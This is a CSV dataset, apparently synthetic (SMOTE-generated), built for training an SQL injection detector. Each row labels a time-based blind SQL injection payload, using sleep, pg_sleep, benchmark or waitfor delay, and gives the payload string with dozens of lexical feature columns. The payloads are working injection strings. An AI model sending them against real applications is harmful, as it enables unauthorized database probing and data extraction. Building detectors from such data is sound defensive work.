id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000430,attack,time,"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye",nearest_attack_euclidean,R000066,0.13381421388785641,56.57898849761538,17.884202300476925,3.093182329541802,22.0,1.0,25.463190798092302,8.115797699523075,0.3891282942191047,0.017687649737232025,0.44978453520280576,0.1433995208408575,0.0,3.0,0.0,0.0,0.0,1.0,0.0,4.115797699523076,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000431,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000284,1.2445067501939728,89.39038668700387,26.62329036811068,3.669494709430899,33.49316147244272,10.0,34.76709631889318,11.130128895667955,0.37659098562851157,0.11212926966094998,0.38725438141097845,0.12402536329956004,0.0,4.0,0.0,0.0,0.0,1.3767096318893184,0.0,4.753419263778637,0.0,0.9999999999999999,0.0,1.3767096318893184,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000432,attack,time,1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000233,0.5295542270903778,97.51537642865843,22.515376428658428,2.831005120815382,28.515376428658428,2.0,53.0,14.0,0.29236290467327203,0.02051122015439792,0.5435473340915447,0.14357854108078538,1.0,0.0,0.0,0.0,1.0,0.0,0.0,11.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7423117856707868,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.742311785670787
SMOTE_000433,attack,time,"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""%""  =  """,nearest_attack_euclidean,R000049,0.0732863049505331,93.92571982530029,22.975239941766766,3.19876572625219,30.925719825300295,1.9752399417667643,45.04952011646647,15.975239941766766,0.3292401623794621,0.021021874547051136,0.4796583468329828,0.170079616240504,0.0,3.9752399417667648,0.0,0.0,1.0,1.0,0.0,8.024760058233236,1.975239941766765,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.9752399417667648,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.975239941766765
SMOTE_000434,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   ",nearest_attack_euclidean,R000269,0.6267292715007946,73.26215362250763,26.26215362250763,3.650589887173777,15.262153622507629,21.73784637749237,28.0,8.262153622507629,0.2082941336737213,0.29675960863787026,0.3822028320195828,0.11274342566882559,1.0,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.2621536225076282,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000435,attack,time,1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000171,0.6734259786271434,59.26400691553985,21.792020746619542,3.557879357104738,21.0,10.0,22.0,6.264006915539847,0.35436606067052634,0.1687457431764411,0.37124063498817045,0.10564756116486212,0.0,0.26400691553984673,2.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.0,0.2640069155398468,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000436,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,0.6183954797112053,72.39316593139671,25.767805678100547,3.461628725046137,20.0,10.0,32.39316593139671,10.0,0.2765935030861653,0.13829675154308266,0.44681299382766937,0.13829675154308266,0.0,0.7678056781005479,2.0,0.0,0.0,1.0,0.0,5.232194321899452,0.0,0.9999999999999999,0.0,3.0,0.0,0.7678056781005479,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000437,attack,time,1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000236,0.2085964501582509,91.47893636836103,21.079822728060172,2.8234296736183646,28.0,2.0,49.31929091224069,12.159645456120343,0.3061730805127327,0.02186950575090947,0.5390945497863614,0.13286286394999647,0.0,0.07982272806017121,0.0,0.0,1.0,0.0,0.0,10.079822728060172,0.0,0.0,0.0,1.0,0.0,0.07982272806017138,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000438,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000045,0.03225665504838158,77.00934590005038,16.018691800100765,2.5484469125047884,18.037383600201533,2.0,43.98130819989923,12.990654099949616,0.23421750100143374,0.025970913786197022,0.5711204648335038,0.16869112037886538,0.0,4.0,0.0,0.0,0.0,0.990654099949617,0.0,8.0,0.0,0.0,0.0,0.990654099949617,0.0,1.0,0.0,0.0,0.0,0.990654099949617,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000439,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000125,0.25158550948024144,81.83370588256005,20.0,2.937998345902236,27.0,2.0,41.750558823840066,11.083147058719977,0.3299527349345852,0.024440943328487785,0.5101417951962445,0.13546452654068256,1.0,0.0,0.0,0.0,1.0,0.0,0.0,8.916852941280023,0.08314705871997691,0.0,0.0,1.0,1.0,0.0,0.0,0.08314705871997685,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000440,attack,time,1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #,nearest_attack_euclidean,R000031,0.007111829007010892,55.03127777259522,21.995531746772112,3.5099630530835366,18.0,10.0,22.026809519367326,5.004468253227888,0.32710762466078774,0.18172645814488209,0.40023061952143935,0.09093529767289084,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.0044682532278872,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000441,attack,time,"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000299,1.56994002598271,73.0,22.0,3.3664716989333723,15.446528014814692,18.0,30.0,9.55347198518531,0.21159627417554366,0.2465753424657534,0.410958904109589,0.13086947924911382,0.0,0.5534719851853096,2.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,4.0,0.0,0.5534719851853096,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.44652801481469045,0.5534719851853096,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000442,attack,time,1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,nearest_attack_euclidean,R000010,0.20117394072118708,70.38777996412156,20.0,2.964343492357086,21.048472495515195,2.0,36.29083497309117,11.048472495515195,0.29912998084972725,0.028429384628526885,0.515457576814653,0.15698305770709275,4.0,0.0,0.0,0.0,0.0,0.9515275044848048,0.0,6.096944991030391,0.0,0.0,0.0,0.9515275044848047,1.0,0.0,0.0,0.0,0.0,0.9515275044848048,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.048472495515195335,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0484724955151954
SMOTE_000443,attack,time,"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000096,0.4275916622028965,92.58498584306889,21.56126061769833,2.855194264155976,27.853753539232777,2.0,49.58498584306889,13.146246460767223,0.3009698507703223,0.021606660814522435,0.5354567924877676,0.14196669592738778,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.146246460767223,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8537535392327764,0.14624646076722356,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000444,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",nearest_attack_euclidean,R000060,0.4380900474566897,66.14385772889653,26.928071135551733,3.962515150894261,23.424569084413875,15.431573186689594,20.287715457793063,7.0,0.35440485162161295,0.23313858386543343,0.30662033548048384,0.10583622903246975,0.0,0.0,1.8561422711034687,0.0,0.0,0.07192886444826563,0.0,4.0,0.0,0.0,1.0,1.9280711355517344,0.0,0.0,0.9280711355517344,0.07192886444826566,0.0,0.07192886444826563,1.0,0.0,0.0,0.9999999999999999,0.0,0.9280711355517344,0.0,0.0,0.0,0.07192886444826563,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000445,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000070,0.6892150133874745,56.43058326346961,21.927062552397796,3.6710805888671953,23.0,3.642354184132598,18.788229079337007,11.0,0.40804209089066223,0.06490204840475022,0.3319052954960099,0.1951505652085776,5.642354184132598,0.0,0.0,0.0,0.0,1.0,0.0,2.3576458158674014,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000446,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000172,0.35096827530738983,58.27150550857013,20.546370868572403,3.511886528411424,23.0,3.1821236228574676,21.089381885712662,11.0,0.39499395171121326,0.054832288820610225,0.3612636086497702,0.18891015081840634,5.182123622857468,0.0,0.0,0.0,0.0,1.0,0.0,2.8178763771425324,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000447,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000253,0.8941077812285388,77.53740994701246,27.0,3.7437679707139946,23.0,15.0,28.736690544598495,10.800719402413964,0.2991841052083277,0.19512006861412678,0.3667188981857502,0.13897692799179523,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.800719402413964,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000448,attack,time,"1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000033,0.4971798341672333,85.23239519274924,27.0,3.4481419255623744,16.0,21.0,37.38591615419939,10.846479038549848,0.18780960047602815,0.24650010062478694,0.4384665190836458,0.1272237798155391,0.846479038549848,0.15352096145015193,0.0,0.0,0.0,1.0,0.0,6.846479038549848,0.0,0.0,1.0,1.0,0.8464790385498481,0.15352096145015195,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000449,attack,time,"1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000297,1.0990050468648476,91.20280036934814,28.550700092337035,3.8134152066236915,20.0,29.0,32.20280036934814,10.0,0.21939639876924455,0.31812477821540464,0.35278062363072854,0.10969819938462227,0.0,0.4492999076629648,2.0,0.0,0.0,2.0,0.0,4.550700092337035,0.0,0.0,1.0,4.0,0.0,0.4492999076629648,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000450,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000092,0.4351781083025563,77.83423612851433,18.16576387148566,2.6863882265336176,18.83423612851434,2.0,44.0,13.0,0.2419613605698212,0.02569622506542979,0.5653169514394554,0.16702546292529363,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8342361285143403,0.16576387148565938,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000451,attack,time,"1%""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000246,0.8535656159865148,94.74946684969157,22.562633287577103,2.8798648649731717,28.0,2.0,50.74946684969158,14.0,0.2956451533320736,0.021117510952290974,0.5354147590495986,0.1478225766660368,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.437366712422897,0.562633287577105,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000452,attack,time,"1%""   )    )    or sleep  (  5  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000240,2.0878605727524153,68.33760175931434,16.541399890042854,2.535845948633459,13.668800879657173,2.0,39.66880087965717,13.0,0.19595930084435684,0.02966250723469692,0.5815718948954165,0.19280629702552982,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.917200219914293,1.082799780085707,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000453,attack,time,1   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000191,0.25668619196387943,77.16344212413179,25.163442124131787,3.2953962054495114,20.0,10.0,37.0,10.163442124131787,0.25920288632539273,0.12960144316269637,0.47952533970197664,0.1316703308099342,0.0,0.08172106206589369,2.0,0.0,0.0,1.0,0.0,6.0,0.08172106206589372,0.9999999999999999,0.0,3.0,0.0,0.08172106206589375,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000454,attack,time,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000050,0.6142214081589381,68.08338721575659,29.260423401969575,4.354954950579726,28.041693607878294,12.0,14.781270205908722,13.260423401969573,0.41140065101525125,0.17719869796949758,0.21625949973565842,0.19514115127959278,5.130211700984788,0.0,1.7395765980304263,0.0,0.0,1.0,0.0,1.1302117009847867,0.0,0.0,0.0,5.0,1.0,0.0,0.8697882990152132,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.13021170098478688,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.130211700984787
SMOTE_000455,attack,time,"1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000267,0.22445815111516876,80.09514915543072,26.09514915543072,3.484720730779386,16.0,21.0,34.0,9.095149155430716,0.19976506381375134,0.26219164625554864,0.42450076060422154,0.11354252932647854,0.0,0.09514915543071689,0.0,0.0,0.0,1.0,0.0,6.0,0.0,0.0,1.0,1.0,0.0,0.09514915543071689,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000456,attack,time,"1""   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --",nearest_attack_euclidean,R000076,1.2151016331879436,62.74947270320855,22.900210918716578,3.5012529891217485,19.900210918716578,10.0,25.299367243850263,7.549894540641711,0.31827531496297823,0.15961673665843962,0.401916316707802,0.1201916316707802,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.5498945406417106,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5498945406417108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.549894540641711
SMOTE_000457,attack,time,"1""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000063,0.3826451989341369,71.20697504541987,26.206975045419867,3.526429886538659,20.0,10.0,31.0,10.206975045419865,0.28088037932151855,0.14044018966075927,0.4353645879483537,0.1433148430693685,0.0,1.0,2.0,0.0,0.0,1.0,0.0,5.0,0.20697504541986578,0.9999999999999999,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000458,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'lbmp'  =  'lbmp,nearest_attack_euclidean,R000270,0.2857621542102999,78.0,16.988753103254076,2.657186030945735,19.0,2.0,44.0,13.0,0.24358974358974358,0.025641025641025633,0.5641025641025641,0.16666666666666666,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000459,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000103,0.7456070200272155,90.44977510024013,24.510044979951974,3.0784686709253815,29.510044979951974,2.0,45.449775100240124,13.489955020048026,0.32738760496620706,0.02215914306580702,0.5014192810193421,0.14903397094864385,1.0,0.0,0.0,0.0,1.0,0.0,0.0,9.489955020048026,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.2449775100240129,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.244977510024013
SMOTE_000460,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000079,0.20674484189276277,66.97708008515414,26.0,3.610062947657536,20.0,10.0,27.78166406812331,9.195416017030826,0.29886009353327303,0.14943004676663652,0.4144704793420778,0.13723938035801267,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.195416017030827,0.0,0.9999999999999999,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000461,attack,time,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",nearest_attack_euclidean,R000232,0.6567421827961613,95.0,27.60291741245882,3.590474026831301,33.40437611868823,10.0,39.39708258754118,12.19854129377059,0.3516250117756656,0.10526315789473684,0.4147061325004335,0.1284056978291641,0.0,4.0,0.0,0.0,0.0,1.19854129377059,0.0,6.0,0.0,0.9999999999999999,0.0,1.1985412937705897,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.1985412937705897,0.8014587062294103,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
